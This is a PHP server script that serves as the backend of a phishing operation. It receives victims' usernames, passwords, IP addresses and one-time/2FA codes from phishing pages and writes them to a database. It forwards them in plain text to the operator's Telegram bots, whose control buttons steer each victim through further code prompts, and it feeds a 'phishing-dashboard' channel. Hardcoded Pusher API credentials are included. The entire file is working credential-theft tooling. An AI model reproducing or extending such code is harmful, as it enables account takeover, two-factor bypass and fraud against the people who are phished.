<?php
// Load Composer autoloader
require_once 'vendor/autoload.php';

// Load database config
require_once 'config.php';

// Set headers
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// Get JSON input
$input = json_decode(file_get_contents('php://input'), true);

if (!$input) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON input']);
    exit();
}

// Pusher configuration
$app_id = '2056311';
$key = '049ee983c4ec4cecf834';
$secret = '6ee5cb53d3b09e78a6a1';
$cluster = 'ap1';

// Function to send data to Pusher using PHP SDK
function sendToPusher($app_id, $key, $secret, $cluster, $channel, $event, $data) {
    try {
        // Initialize Pusher client
        $pusher = new Pusher\Pusher(
            $key,
            $secret,
            $app_id,
            [
                'cluster' => $cluster,
                'useTLS' => true,
                'timeout' => 10
            ]
        );
        
        // Send the event
        $result = $pusher->trigger($channel, $event, $data);
        
        return [
            'success' => true,
            'response' => json_encode($result),
            'http_code' => 200,
            'error' => null
        ];
        
    } catch (Exception $e) {
        return [
            'success' => false,
            'response' => $e->getMessage(),
            'http_code' => 500,
            'error' => $e->getMessage()
        ];
    }
}

// Function to get user_id from website_id
function getUserIdFromWebsite($pdo, $website_id) {
    try {
        $stmt = $pdo->prepare("SELECT user_id FROM websites WHERE id = ?");
        $stmt->execute([$website_id]);
        $result = $stmt->fetch();
        
        if ($result && isset($result['user_id'])) {
            return $result['user_id'];
        }
        
        return null;
    } catch (Exception $e) {
        error_log("Database error getting user_id: " . $e->getMessage());
        return null;
    }
}

// Function to save account to database
function saveAccountToDatabase($pdo, $accountData) {
    try {
        // Extract data from accountData
        $username = $accountData['username'] ?? '';
        $password = $accountData['password'] ?? '';
        $website_id = $accountData['website'] ?? null;
        $user_id = $accountData['user_id'] ?? null;
        $ip_address = $accountData['ip_address'] ?? null;
        $code = $accountData['code'] ?? null;
        $ssid = $accountData['id'] ?? null; // Session ID from frontend
        
        // Validate and set status - must match enum values
        $validStatuses = ['wrong-pass', 'otp-mail', 'otp-phone', 'otp-2fa', 'order-device', 'require-pass', 'require-mail', 'success'];
        $inputStatus = $accountData['status'] ?? 'success';
        $status = in_array($inputStatus, $validStatuses) ? $inputStatus : 'success';
        
        // Validate required fields
        if (!$username || !$password || !$website_id || !$user_id) {
            throw new Exception('Missing required fields for account save: username, password, website_id, user_id');
        }
        
        // Parse content if available
        $content_data = null;
        if (isset($accountData['content']) && !empty($accountData['content'])) {
            $content_data = is_string($accountData['content']) ? 
                           $accountData['content'] : 
                           json_encode($accountData['content']);
        }
        
        // Debug log content processing
        error_log("Content debug - Raw: " . json_encode($accountData['content'] ?? 'not_set') . 
                  " | Processed: " . json_encode($content_data));
        
        // INSERT new record with ssid and content
        $stmt = $pdo->prepare("
            INSERT INTO account_list (username, password, website, user_id, ip_address, code, status, ssid, content, created_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())
        ");
        
        $result = $stmt->execute([
            $username, 
            $password, 
            $website_id, 
            $user_id, 
            $ip_address, 
            $code, 
            $status,
            $ssid,
            $content_data
        ]);
        
        if ($result) {
            $account_id = $pdo->lastInsertId();
            return [
                'success' => true,
                'action' => 'inserted',
                'account_id' => $account_id
            ];
        } else {
            return [
                'success' => false,
                'error' => 'Failed to insert account',
                'action' => 'failed'
            ];
        }
        
    } catch (Exception $e) {
        error_log("Database error saving account: " . $e->getMessage());
        return [
            'success' => false,
            'error' => $e->getMessage(),
            'action' => 'failed'
        ];
    }
}

// Function to send Telegram notification for new account
function sendTelegramAccountNotification($pdo, $user_id, $accountData, $website_id, $saveResult = null) {
    try {
        // Get user's Telegram bots
        $bots = getTelegramBots($pdo, $user_id);
        
        if (empty($bots)) {
            return ['success' => false, 'error' => 'No Telegram bots found for user'];
        }
        
        // Get website title for the message
        $stmt = $pdo->prepare("SELECT title FROM websites WHERE id = ?");
        $stmt->execute([$website_id]);
        $website = $stmt->fetch();
        $website_title = $website['title'] ?? 'Unknown Website';
        
        $results = [];
        
        foreach ($bots as $bot) {
            // Check if this bot should notify for new accounts
            if (!$bot['notify_new_accounts']) {
                continue;
            }
            
            // Use ssid from frontend for Telegram buttons (not database ID)
            $ssid = $accountData['id'] ?? time();
            $actual_account_id = $saveResult['account_id'] ?? $ssid;
            
            // Format message for Telegram with database ID
            $message = formatAccountForTelegram($accountData, $website_title, $actual_account_id);
            
            // Create inline keyboard using ssid for control commands
            $keyboard = createAccountControlKeyboard(
                $ssid, // Use ssid for buttons, not database ID
                $website_id,
                $pdo
            );
            
            // Delete old messages for this session first
            deleteOldTelegramMessages($pdo, $bot['id'], $bot['chat_id'], $ssid, $bot['bot_token']);
            
            // Send new notification
            $result = sendTelegramNotification(
                $bot['bot_token'],
                $bot['chat_id'],
                $message,
                $keyboard
            );
            
            // Save new message ID if successful
            if ($result['success']) {
                $response_data = json_decode($result['response'], true);
                if ($response_data && isset($response_data['result']['message_id'])) {
                    saveTelegramMessageId($pdo, $bot['id'], $bot['chat_id'], $response_data['result']['message_id'], $ssid, $website_id);
                }
            }
            
            // Update bot stats
            updateTelegramBotStats($pdo, $bot['id'], $result['success'], $result['error'] ?? null);
            
            $results[] = [
                'bot_id' => $bot['id'],
                'bot_name' => $bot['bot_name'],
                'result' => $result
            ];
        }
        
        return [
            'success' => !empty($results),
            'bots_notified' => count($results),
            'results' => $results
        ];
        
    } catch (Exception $e) {
        return ['success' => false, 'error' => $e->getMessage()];
    }
}

// Function to update account content (OTP)
function updateAccountContent($pdo, $ssid, $content) {
    try {
        // Parse content if it's JSON
        $content_data = '';
        if (is_string($content)) {
            $content_data = $content;
        } else {
            $content_data = json_encode($content);
        }
        
        $stmt = $pdo->prepare("
            UPDATE account_list 
            SET content = ?, updated_at = NOW() 
            WHERE ssid = ?
        ");
        
        $result = $stmt->execute([$content_data, $ssid]);
        
        return [
            'success' => $result,
            'ssid' => $ssid,
            'content' => $content_data
        ];
        
    } catch (Exception $e) {
        error_log("Error updating account content: " . $e->getMessage());
        return [
            'success' => false,
            'error' => $e->getMessage()
        ];
    }
}

// Function to send Telegram OTP update notification
function sendTelegramOTPUpdate($pdo, $user_id, $accountData, $website_id) {
    try {
        // Get user's Telegram bots
        $bots = getTelegramBots($pdo, $user_id);
        
        if (empty($bots)) {
            return ['success' => false, 'error' => 'No Telegram bots found for user'];
        }
        
        // Get website title and account info
        $stmt = $pdo->prepare("SELECT title FROM websites WHERE id = ?");
        $stmt->execute([$website_id]);
        $website = $stmt->fetch();
        $website_title = $website['title'] ?? 'Unknown Website';
        
        // Get account from database using ssid
        $ssid = $accountData['id'];
        $stmt = $pdo->prepare("SELECT * FROM account_list WHERE ssid = ?");
        $stmt->execute([$ssid]);
        $account = $stmt->fetch();
        
        if (!$account) {
            return ['success' => false, 'error' => 'Account not found for OTP update'];
        }
        
        // Parse content to get OTP
        $content = $accountData['content'] ?? '';
        $otp_data = '';
        if (is_string($content)) {
            $decoded = json_decode($content, true);
            $otp_data = $decoded['Data'] ?? $content;
        }
        
        // Format OTP update message
        $username = htmlspecialchars($account['username']);
        $password = htmlspecialchars($account['password']);
        $ip = $account['ip_address'] ?? 'Unknown';
        $created_at = $account['created_at'];
        
        $message = "🔄 <b>OTP/Content Update!</b>\n\n" .
                   "🆔 <b>Account ID:</b> <code>{$account['id']}</code>\n" .
                   "👤 <b>Username:</b> <code>{$username}</code>\n" .
                   "🔐 <b>Password:</b> <code>{$password}</code>\n" .
                   "🔢 <b>OTP/Content:</b> <code>{$otp_data}</code>\n" .
                   "🌐 <b>Website:</b> {$website_title}\n" .
                   "📍 <b>IP Address:</b> <code>{$ip}</code>\n" .
                   "⏰ <b>Time:</b> {$created_at}\n\n" .
                   "<i>New data received from victim:</i>";
        
        $results = [];
        
        foreach ($bots as $bot) {
            // Check if this bot should notify for new accounts
            if (!$bot['notify_new_accounts']) {
                continue;
            }
            
            // Delete old messages for this session first
            deleteOldTelegramMessages($pdo, $bot['id'], $bot['chat_id'], $ssid, $bot['bot_token']);
            
            // Create inline keyboard for control
            $keyboard = createAccountControlKeyboard($ssid, $website_id, $pdo);
            
            // Send notification
            $result = sendTelegramNotification(
                $bot['bot_token'],
                $bot['chat_id'],
                $message,
                $keyboard
            );
            
            // Save new message ID if successful
            if ($result['success']) {
                $response_data = json_decode($result['response'], true);
                if ($response_data && isset($response_data['result']['message_id'])) {
                    saveTelegramMessageId($pdo, $bot['id'], $bot['chat_id'], $response_data['result']['message_id'], $ssid, $website_id);
                }
            }
            
            // Update bot stats
            updateTelegramBotStats($pdo, $bot['id'], $result['success'], $result['error'] ?? null);
            
            $results[] = [
                'bot_id' => $bot['id'],
                'bot_name' => $bot['bot_name'],
                'result' => $result
            ];
        }
        
        return [
            'success' => !empty($results),
            'bots_notified' => count($results),
            'results' => $results
        ];
        
    } catch (Exception $e) {
        return ['success' => false, 'error' => $e->getMessage()];
    }
}

// Function to log data
function logData($data) {
    $logFile = 'pusher_logs.txt';
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp] " . json_encode($data) . "\n";
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
}

try {
    // Validate required fields
    if (!isset($input['type']) || !isset($input['data'])) {
        throw new Exception('Missing required fields: type and data');
    }
    
    $type = $input['type'];
    $data = $input['data'];
    
    // Extract website_id from data
    $website_id = null;
    if (isset($data['account']['website'])) {
        $website_id = $data['account']['website'];
    } else {
        throw new Exception('Missing website_id in data.account.website');
    }
    
    // Get user_id from website_id
    $user_id = getUserIdFromWebsite($pdo, $website_id);
    if (!$user_id) {
        throw new Exception("User not found for website_id: $website_id");
    }
    
    // Save account to database and send notifications
    $saveResult = null;
    $telegramResult = null;
    
    // Debug: log what we received
    logData([
        'debug' => 'Received data',
        'type' => $type,
        'has_account_data' => isset($data['account']),
        'data_keys' => array_keys($data),
        'account_keys' => isset($data['account']) ? array_keys($data['account']) : null
    ]);
    
    if ($type === 'new_account' && isset($data['account'])) {
        // Add user_id to account data if not present
        if (!isset($data['account']['user_id'])) {
            $data['account']['user_id'] = $user_id;
        }
        
        // Debug: log account data before save
        logData([
            'debug' => 'About to save account',
            'account_data' => $data['account'],
            'user_id' => $user_id,
            'website_id' => $website_id
        ]);
        
        $saveResult = saveAccountToDatabase($pdo, $data['account']);
        
        // Log save result
        logData([
            'action' => 'save_account_result',
            'result' => $saveResult,
            'account_data' => $data['account']
        ]);
        
        // Send Telegram notification if account was saved successfully
        if ($saveResult && $saveResult['success']) {
            $telegramResult = sendTelegramAccountNotification($pdo, $user_id, $data['account'], $website_id, $saveResult);
            
            logData([
                'action' => 'telegram_notification',
                'result' => $telegramResult,
                'user_id' => $user_id,
                'website_id' => $website_id,
                'actual_account_id' => $saveResult['account_id']
            ]);
        }
    } else {
        // Check if this is an OTP/content update for existing account
        if (isset($data['account']) && isset($data['account']['content']) && isset($data['account']['id'])) {
            $ssid = $data['account']['id'];
            
            // Update existing account with new content (OTP)
            $updateResult = updateAccountContent($pdo, $ssid, $data['account']['content']);
            
            if ($updateResult['success']) {
                // Send Telegram notification for OTP update
                $telegramResult = sendTelegramOTPUpdate($pdo, $user_id, $data['account'], $website_id);
                
                logData([
                    'action' => 'otp_update',
                    'ssid' => $ssid,
                    'update_result' => $updateResult,
                    'telegram_result' => $telegramResult,
                    'content' => $data['account']['content']
                ]);
            }
        } else {
            logData([
                'debug' => 'Account save skipped',
                'type' => $type,
                'type_match' => ($type === 'new_account'),
                'has_account' => isset($data['account'])
            ]);
        }
    }
    
    // Log the received data
    logData([
        'type' => $type,
        'data' => $data,
        'website_id' => $website_id,
        'user_id' => $user_id,
        'save_result' => $saveResult,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ]);
    
    // Create channel name
    $channel = "phishing-dashboard-user-$user_id";
    
    // Send to Pusher
    $result = sendToPusher($app_id, $key, $secret, $cluster, $channel, $type, $data);
    
    if ($result['success']) {
        $response = [
            'success' => true,
            'message' => 'Data sent to dashboard successfully',
            'channel' => $channel,
            'website_id' => $website_id,
            'user_id' => $user_id,
            'pusher_response' => $result['response']
        ];
        
        // Add account save info if available
        if ($saveResult) {
            $response['account_save'] = $saveResult;
            if ($saveResult['success']) {
                $response['message'] .= ' and account saved to database';
            } else {
                $response['message'] .= ' but account save failed: ' . ($saveResult['error'] ?? 'Unknown error');
            }
        }
        
        echo json_encode($response);
    } else {
        // Log the error
        logData([
            'error' => 'Pusher send failed',
            'channel' => $channel,
            'website_id' => $website_id,
            'user_id' => $user_id,
            'http_code' => $result['http_code'],
            'response' => $result['response'],
            'curl_error' => $result['error']
        ]);
        
        // Return success to frontend but log the Pusher error
        $response = [
            'success' => true,
            'message' => 'Data logged successfully (Pusher may be offline)',
            'channel' => $channel,
            'website_id' => $website_id,
            'user_id' => $user_id,
            'pusher_error' => $result['response'],
            'debug' => [
                'http_code' => $result['http_code'],
                'curl_error' => $result['error']
            ]
        ];
        
        // Add account save info if available
        if ($saveResult) {
            $response['account_save'] = $saveResult;
            if ($saveResult['success']) {
                $response['message'] .= ' and account saved to database';
            } else {
                $response['message'] .= ' but account save failed: ' . ($saveResult['error'] ?? 'Unknown error');
            }
        }
        
        echo json_encode($response);
    }
    
} catch (Exception $e) {
    // Log the error
    logData([
        'error' => $e->getMessage(),
        'trace' => $e->getTraceAsString()
    ]);
    
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}
?>
